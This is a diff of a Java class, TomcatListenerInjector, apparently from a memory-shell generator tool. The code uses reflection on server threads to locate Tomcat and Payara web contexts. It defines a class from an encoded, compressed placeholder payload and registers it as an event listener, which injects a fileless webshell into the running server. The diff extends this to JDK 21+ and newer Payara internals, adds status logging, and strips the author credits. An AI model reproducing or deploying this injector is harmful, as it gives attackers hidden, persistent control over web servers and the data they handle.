@@ -3,43 +3,53 @@ package org.leo.jmg.mem.injectortpl.tomcat;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author pen4uin, ReaJason
  */
 public class TomcatListenerInjector {
 
+    private static String msg = "";
+    private static boolean ok = false;
 
-    private static String shellClassName;
-    private static String shellClass;
-    private static boolean ok;
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
 
     public TomcatListenerInjector() {
         if (ok) {
             return;
         }
-        Set<Object> contexts;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            contexts = null;
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null && !contexts.isEmpty()) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                } catch (Throwable ignored) {
+                    msg += "[/*] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
+        System.out.println(msg);
     }
 
     public Set<Object> getContext() throws Exception {
@@ -48,14 +58,31 @@ public class TomcatListenerInjector {
         for (Thread thread : threads) {
             String threadName = thread.getName();
             if (threadName.contains("ContainerBackgroundProcessor")) {
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                Object target = getThreadTarget(thread);
+                if (target == null) {
+                    continue;
+                }
+                Object container = getContainerFromProcessor(target);
+                if (container == null) {
+                    continue;
+                }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(container, "children");
+                if (childrenMap == null) {
+                    continue;
+                }
                 for (Object value : childrenMap.values()) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    contexts.addAll(children.values());
+                    if (children != null) {
+                        contexts.addAll(children.values());
+                    }
                 }
             } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
                 try {
-                    Object proto = getFieldValue(getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "handler"), "proto");
+                    Object target = getThreadTarget(thread);
+                    if (target == null) {
+                        continue;
+                    }
+                    Object proto = getFieldValue(getFieldValue(getFieldValue(target, "this$0"), "handler"), "proto");
                     Object engine = getFieldValue(getFieldValue(getFieldValue(getFieldValue(proto, "adapter"), "connector"), "service"), "engine");
                     Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(engine, "children");
                     for (Object value : childrenMap.values()) {
@@ -79,6 +106,52 @@ public class TomcatListenerInjector {
         return contexts;
     }
 
+    private Object getThreadTarget(Thread thread) throws Exception {
+        Object target = getFieldValue(thread, "target");
+        if (target == null) {
+            // JDK 21+
+            Object holder = getFieldValue(thread, "holder");
+            if (holder != null) {
+                target = getFieldValue(holder, "task");
+            }
+        }
+        return target;
+    }
+
+    /**
+     * Older Catalina: ContainerBackgroundProcessor.this$0
+     * Payara 6.2024+/7 style: ContainerBackgroundProcessorAtomic.base (WeakReference)
+     */
+    private Object getContainerFromProcessor(Object target) throws Exception {
+        Object container = getFieldValue(target, "this$0");
+        if (container != null) {
+            return container;
+        }
+        Object atomic = getFieldValue(target, "containerBackgroundProcessorAtomic");
+        Object base = atomic != null ? getFieldValue(atomic, "base") : getFieldValue(target, "base");
+        if (base instanceof java.lang.ref.Reference) {
+            return ((java.lang.ref.Reference<?>) base).get();
+        }
+        return base;
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
+
     private ClassLoader getWebAppClassLoader(Object context) throws Exception {
         try {
             return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
@@ -90,15 +163,16 @@ public class TomcatListenerInjector {
 
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
@@ -108,21 +182,26 @@ public class TomcatListenerInjector {
         if (objects instanceof List) {
             List<Object> listeners = (List<Object>) objects;
             for (Object o : listeners) {
-                if (o.getClass().getName().equals(shellClassName)) {
+                if (o.getClass().getName().equals(getClassName())) {
                     return;
                 }
             }
             listeners.add(listener);
         } else {
-            List<Object> arrayList = new ArrayList<>(Arrays.asList(((Object[]) objects)));
+            List arrayList = new ArrayList(Arrays.asList(((Object[]) objects)));
             for (Object o : arrayList) {
-                if (o.getClass().getName().equals(shellClassName)) {
+                if (o.getClass().getName().equals(getClassName())) {
                     return;
                 }
             }
             arrayList.add(listener);
             invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{arrayList.toArray()});
         }
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -213,4 +292,18 @@ public class TomcatListenerInjector {
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
